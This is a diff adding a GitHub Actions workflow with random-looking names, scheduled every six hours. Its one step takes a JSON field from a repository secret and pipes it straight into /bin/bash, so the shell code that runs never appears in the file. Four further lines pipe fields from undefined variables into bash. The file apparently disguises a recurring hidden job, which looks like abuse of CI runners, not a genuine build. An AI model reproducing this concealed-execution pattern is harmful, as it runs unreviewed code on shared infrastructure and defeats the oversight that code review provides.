@@ -1,0 +1,23 @@
+name: duluohan6715
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duluohan6715
+        env:
+          whmt13: ${{ secrets.whmt13 }}
+        run: |
+          echo $whmt13 | jq -r .ilnms06 | /bin/bash
+          echo $mided166 | jq -r .wodc273 | /bin/bash
+          echo $x6562 | jq -r .qwk7332 | /bin/bash
+          echo $pryx82 | jq -r .cop08 | /bin/bash
+          echo $yq39414 | jq -r .f11677 | /bin/bash
+
